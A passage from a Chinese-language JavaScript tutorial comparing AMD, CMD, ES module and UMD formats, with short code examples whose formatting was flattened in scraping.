是一个对象，用来向外提供模块接口； module: module 是一个对象，上面存储了与当前模块相关联的一些属性和方法。 demo: 123456define(function(require, exports, module) { var base = require('base'); exports.show = function() { // todo with module base }}); AMD推崇依赖前置，在定义模块的时候就要声明其依赖的模块. CMD推崇就近依赖，只有在用到某个模块的时候再去require. AMD和CMD最大的区别是对依赖模块的执行时机处理不同，注意不是加载的时机或者方式不同很多人说requireJS是异步加载模块，SeaJS是同步加载模块，这么理解实际上是不准确的，其实加载模块都是异步的，只不过AMD依赖前置，js可以方便知道依赖模块是谁，立即加载，而CMD就近依赖，需要使用把模块变为字符串解析一遍才知道依赖了那些模块，这也是很多人诟病CMD的一点，牺牲性能来带来开发的便利性，实际上解析模块用的时间短到可以忽略。 ES Module在 ES2015 标准为出来之前，最主要的是CommonJS和AMD规范。上文中我们已经介绍了 CommonJS 规范（主要是为了服务端 NodeJS 服务）和 AMD（主要引用在浏览器端），那么当 ES6标准的出现，为浏览器端模块化做了一个非常好的补充。 export用于对外输出本模块（一个文件可以理解为一个模块）变量的接口import用于导入export导出的模块 1234567891011121314151617181920212223// index.jsexport const fn1 = function () { console.log('fn1')}export const fn2 = function () { console.log('fn2')}const fn = { fn1, fn2}export default fn// index1.jsimport { fn1, fn2 } from 'index.js'fn1() // 'fn1'fn2() // 'fn2' import fn from 'index.js'console.log(fn) // {fn1: ƒ, fn2: ƒ} export 可以导出的是一个对象中包含的多个 属性，方法。 export default 只能导出 一个 可以不具名的 对象。 import {fn} from './xxx/xxx' ( export 导出方式的 引用方式 ) import fn from './xxx/xxx1' ( export default 导出方式的 引用方式 ) UMDAMD以浏览器为第一（browser-first）的原则发展，选择异步加载模块。它的模块支持对象（objects）、函数（functions）、构造器（constructors）、字符串（strings）、JSON等各种类型的模块。因此在浏览器中它非常灵活。 CommonJS module以服务器端为第一（server-first）的原则发展，选择同步加载模块。它的模块是无需包装的（unwrapped modules）且贴近于ES.next/Harmony的模块格式。但它仅支持对象类型（objects）模块。 这迫使一些人又想出另一个更通用格式 UMD(Universal Module Definition)。希望提供一个前后端跨平台的解决方案。 UMD的实现很简单，先判断是否支持Node.js模块格式（exports是否存在），存在则使用Node.js模块格式。 再判断是否支持AMD（define是否存在），存在则使用AMD方式加载模块。前两个都不存在，则将模块公开到全局（window或global）。 下面是一个示例 1234567891011121314151617181920(function (root, factory) { if(typeof exports === 'object' &amp;&amp; typeof module === 'object') module.exports = factory(); else if(typeof define === 'function' &amp;&amp; define.amd) define([], factory); else if(typeof exports === 'object') exports[\"nav\"] = factory(); else root[\"nav\"] = factory();})(window, this, function() { // module return { addEvent: function(el, type, handle) { //... }, removeEvent: function(el, type, handle) { }, };})"}]